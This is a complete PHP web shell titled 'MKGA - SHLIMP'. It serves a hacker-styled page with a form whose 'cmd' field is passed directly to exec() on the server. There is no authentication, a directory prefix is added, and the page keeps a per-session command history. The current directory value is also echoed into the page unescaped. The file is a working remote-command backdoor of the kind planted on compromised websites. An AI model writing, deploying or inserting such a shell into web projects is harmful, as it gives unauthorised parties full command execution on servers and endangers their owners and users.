<?php

session_start();

/**
 * Converts a given text to leet speak.
 *
 * @param string $text The input text to convert.
 *
 * @return string The converted leet speak text.
 */
function leet(string $text): string {
    $leetDict = [
        'a' => '4',
        'b' => '8',
        'e' => '3',
        'g' => '6',
        'i' => '!',
        'l' => '1',
        'o' => '0',
        's' => '5',
        't' => '7',
        'z' => '2'
    ];

    return strtr(strtolower($text), $leetDict);
}

/**
 * Displays the output in a formatted way.
 *
 * @param array $output The output lines to display.
 *
 * @return void
 */
function showOutput(array $output): void {
    foreach ($output as $line) {
        echo htmlspecialchars($line) . "\n";
    }
}

/**
 * Executes a shell command and returns the output.
 *
 * @param string $command The command to execute.
 *
 * @return array The output lines from the command.
 */
function executeCommand(string $command): array {
    $output = [];
    $retCode = 0;

    exec($command, $output, $retCode);

    return $output;
}

/**
 * Shows the help message.
 *
 * @return void
 */
function showHelper(): void {
    $helpText = [
        "Available commands:",
        "help    - Show this help message",
        "clear   - Clear command history",
        "Other commands will be executed on the server."
    ];

    showOutput($helpText);
}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>6D 68 67 61</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                height: 100vh;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                background-color: #111;
                color: #0f0;
                font-family: monospace;
            }

            h1 {
                margin-bottom: 20px;
                font-size: 24px;
            }

            form {
                margin-bottom: 20px;
                display: flex;
                gap: 10px;
            }

            input[type="text"] {
                padding: 5px;
                background: #000;
                color: #0f0;
                border: 1px solid #0f0;
                width: 200px;
            }

            input[type="submit"] {
                background: #0f0;
                color: #000;
                border: none;
                padding: 5px 10px;
                cursor: pointer;
                font-weight: bold;
            }

            .outputs {
                display: flex;
                justify-content: center;
                align-items: center;
                gap: 20px;
            }

            textarea {
                background: #000;
                color: #0f0;
                border: 1px solid #0f0;
                resize: none;
                width: 350px;
                height: 300px;
            }
        </style>
    </head>
    <body>
        <h1>MKGA - SHLIMP</h1>

        <form method="POST">
            <input type="text" name="cmd" placeholder="Enter command here..." autofocus>
            <input type="text" name="current_dir" placeholder="Current directory..." value="<?= $_POST['current_dir'] ?? getcwd(); ?>">
            <input type="submit" name="execute" value="RUN!">
        </form>

        <div class="outputs">
            <textarea name="output" rows="30" cols="30" readonly>
                <?php
                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                        $input = $_POST['cmd'] ?? '';
                        $currentDir = $_POST['current_dir'] ?? getcwd();
                        $command = sprintf("cd %s && %s", $currentDir, $input);

                        if (empty($input)) {
                            echo leet('No command entered.');
                            return;
                        }

                        switch ($input) {
                            case 'help':
                                showHelper();
                                break;

                            case 'clear':
                                $_SESSION['history'] = [];
                                echo leet('History cleared.');
                                break;

                            default:
                                showOutput(executeCommand($command));
                                break;
                        }

                        $_SESSION['history'][] = sprintf("%d. %s", count($_SESSION['history']) + 1, $command);
                    }
                ?>
            </textarea>

            <textarea name="history" rows="30" cols="30" readonly>
                <?php showOutput($_SESSION['history'] ?? []); ?>
            </textarea>
        </div>
    </body>
</html>
